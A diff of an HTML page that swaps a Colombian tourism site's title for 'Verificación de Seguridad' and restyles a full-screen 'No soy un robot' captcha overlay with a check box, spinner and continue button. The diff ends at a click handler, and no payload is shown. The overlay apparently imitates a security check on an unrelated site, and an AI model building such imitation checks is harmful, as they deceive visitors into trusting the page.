@@ -3,67 +3,50 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Descubre Colombia: Turismo y Viajes Inolvidables</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com/">
-  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <title>Verificación de Seguridad</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --primary-color: #2a9d8f;
-      --secondary-color: #264653;
-      --accent-color: #007BFF;
-      --light-bg: #f4f4f4;
-      --font-main: 'Roboto', sans-serif;
+    * {
+      box-sizing: border-box;
     }
 
     body {
       margin: 0;
-      font-family: var(--font-main);
-      line-height: 1.6;
-      background: #fff;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f0f0f0;
     }
 
-    /* Captcha Overlay */
     #captchaOverlay {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: rgba(211, 211, 211, 0.85);
+      background: rgba(240, 240, 240, 0.95);
       z-index: 9999;
       display: flex;
-      align-items: center;
       justify-content: center;
-      animation: fadeIn 0.5s ease-in-out;
+      align-items: center;
+      animation: fadeIn 0.4s ease-in;
     }
 
     .container {
-      background: #fff;
-      border-radius: 12px;
+      background: white;
       padding: 30px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 360px;
+      border-radius: 10px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      width: 320px;
       text-align: center;
-      animation: scaleIn 0.5s ease-in-out;
+      animation: slideIn 0.5s ease-out;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
-    }
-
-    @keyframes scaleIn {
-      0% { transform: scale(0.9); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
-    .container h1 {
-      font-size: 22px;
-      margin-bottom: 15px;
+    h1 {
+      font-size: 20px;
       color: #333;
+      margin-bottom: 20px;
     }
 
     .captchat {
       position: relative;
+      width: 100%;
       border: 1px solid #ccc;
       border-radius: 8px;
       overflow: hidden;
@@ -84,7 +67,6 @@
       background: #fff;
       border-radius: 4px;
       cursor: pointer;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
       transition: all 0.3s ease;
     }
 
@@ -96,33 +78,24 @@
     .draggable.checked::after {
       content: '✓';
       position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%) scale(1);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       font-size: 16px;
       font-weight: bold;
       color: #007BFF;
-      animation: checkPop 0.3s ease-out;
-    }
-
-    @keyframes checkPop {
-      0% { transform: translate(-50%, -50%) scale(0.2); opacity: 0; }
-      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+      animation: checkPop 0.3s ease;
     }
 
     .loader {
-      border: 4px solid #f3f3f3;
+      margin: 20px auto;
+      width: 32px;
+      height: 32px;
+      border: 4px solid #ccc;
       border-top: 4px solid #007BFF;
       border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      margin: 20px auto;
-      display: none;
       animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      display: none;
     }
 
     .loader.show {
@@ -132,31 +105,45 @@
     #continueBtn {
       margin-top: 15px;
       padding: 12px 20px;
-      font-size: 16px;
-      font-weight: 600;
-      background: linear-gradient(45deg, var(--accent-color), #00C6FF);
-      border: none;
-      border-radius: 8px;
+      font-size: 15px;
+      font-weight: bold;
+      background: #007BFF;
       color: white;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
-      box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
-      transition: all 0.3s ease;
       display: none;
+      transition: background 0.3s ease, transform 0.2s;
     }
 
     #continueBtn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 12px rgba(0, 123, 255, 0.5);
+      background: #0056b3;
+      transform: translateY(-2px);
     }
 
     #continueBtn.show {
       display: inline-block;
-      animation: fadeInBtn 0.4s ease-in-out;
+      animation: fadeIn 0.3s ease-in;
     }
 
-    @keyframes fadeInBtn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes checkPop {
+      0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -166,7 +153,7 @@
     <div class="container">
       <h1>No soy un robot</h1>
       <div class="captchat">
-        <img src="cap.jpg" alt="Imagen de Captcha">
+        <img src="cap.jpg" alt="Captcha">
         <div class="draggable" id="check"></div>
       </div>
       <div class="loader" id="loader"></div>
@@ -174,7 +161,6 @@
     </div>
   </div>
 
-  <!-- Resto del contenido de la web aquí -->
   <script>
     const check = document.getElementById('check');
     const loader = document.getElementById('loader');
@@ -182,7 +168,6 @@
 
     check.addEventListener('click', () => {
       check.classList.toggle('checked');
-      
       loader.classList.remove('show');
       continueBtn.classList.remove('show');
 
